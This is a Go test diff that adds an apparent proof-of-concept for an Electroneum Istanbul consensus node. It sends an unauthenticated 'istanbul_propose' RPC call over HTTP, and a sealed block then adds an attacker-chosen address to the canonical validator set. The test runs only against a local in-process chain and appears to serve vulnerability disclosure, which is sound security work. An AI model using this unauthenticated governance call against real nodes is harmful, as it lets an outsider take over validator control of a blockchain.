@@ -80,3 +80,42 @@ func TestIndependentIstanbulUnauthenticatedVoteInjection(t *testing.T) {
  if _,ok:=cleared[candidate];ok {t.Fatal("candidate not removed by unauthenticated HTTP discard")}
  t.Log("ETN_GOVERNANCE_UNAUTHENTICATED_HTTP_DISCARD_SUCCEEDED")
 }
+
+// This second proof observes the actual one-validator sealed block being imported
+// into BlockChain and then measures the *canonical* validator snapshot. It never
+// connects to the real Electroneum network or uses any real validator key.
+func TestIndependentGovernanceRPCCommitsUnauthorizedValidatorChange(t *testing.T) {
+ chain, engine := newBlockChain(1)
+ defer chain.Stop()
+ defer engine.Stop()
+ srv := rpc.NewServer()
+ defer srv.Stop()
+ if err := srv.RegisterName("istanbul", engine.APIs(chain)[0].Service); err != nil { t.Fatal(err) }
+ transport := httptest.NewServer(srv)
+ defer transport.Close()
+ client, err := rpc.DialHTTP(transport.URL)
+ if err != nil { t.Fatal(err) }
+ defer client.Close()
+ attackerChosen := common.HexToAddress("0x00000000000000000000000000000000000abbcd")
+
+ genesisSnap, err := engine.snapshot(chain,0,common.Hash{},nil)
+ if err != nil {t.Fatal(err)}
+ if genesisSnap.ValSet.Size() != 1 {t.Fatalf("expected one validator, got %d",genesisSnap.ValSet.Size())}
+ if _,val:=genesisSnap.ValSet.GetByAddress(attackerChosen);val!=nil {t.Fatal("candidate already in genesis validator set")}
+ t.Log("ETN_GOVERNANCE_CANONICAL_GENESIS_SINGLE_VALIDATOR_CONFIRMED")
+
+ if err:=client.CallContext(context.Background(),nil,"istanbul_propose",attackerChosen,true);err!=nil {t.Fatal(err)}
+ block := makeBlock(chain, engine, chain.Genesis())
+ if block==nil {t.Fatal("no consensus-finalized block")}
+ candidate,auth,err:=engine.EngineForBlockNumber(block.Number()).ReadVote(block.Header())
+ if err!=nil||candidate!=attackerChosen||!auth {t.Fatalf("sealed block vote mismatch candidate=%s auth=%v err=%v",candidate,auth,err)}
+ if _,err:=chain.InsertChain(types.Blocks{block});err!=nil {t.Fatalf("canonical import of signed block: %v",err)}
+ if chain.GetCanonicalHash(1) != block.Hash() {t.Fatal("vote-carrying block not canonical")}
+ t.Logf("ETN_GOVERNANCE_UNAUTHENTICATED_VOTE_COMMITTED_TO_CANONICAL_BLOCK hash=%s",block.Hash())
+
+ canonicalSnap, err:=engine.snapshot(chain,block.NumberU64(),block.Hash(),nil)
+ if err!=nil {t.Fatalf("canonical validator snapshot: %v",err)}
+ if canonicalSnap.ValSet.Size()!=2 {t.Fatalf("expected validator set expanded from 1 to 2; got %d",canonicalSnap.ValSet.Size())}
+ if _,v:=canonicalSnap.ValSet.GetByAddress(attackerChosen);v==nil {t.Fatal("unauthenticated choice not in canonical validator set")}
+ t.Logf("ETN_GOVERNANCE_UNAUTHENTICATED_CANONICAL_VALIDATOR_ADDITION_CONFIRMED candidate=%s size_before=1 size_after=2",attackerChosen.Hex())
+}
